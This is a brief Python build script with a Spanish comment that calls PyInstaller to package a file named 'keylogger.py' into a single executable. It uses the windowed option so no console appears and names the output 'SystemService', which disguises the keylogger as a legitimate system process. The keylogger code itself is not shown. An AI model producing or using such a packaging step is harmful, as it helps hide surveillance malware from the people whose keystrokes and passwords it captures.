# Para crear ejecutable
import PyInstaller.__main__
import os

PyInstaller.__main__.run([
    'keylogger.py',
    '--onefile',
    '--windowed',
    '--name=SystemService',
    '--clean'
])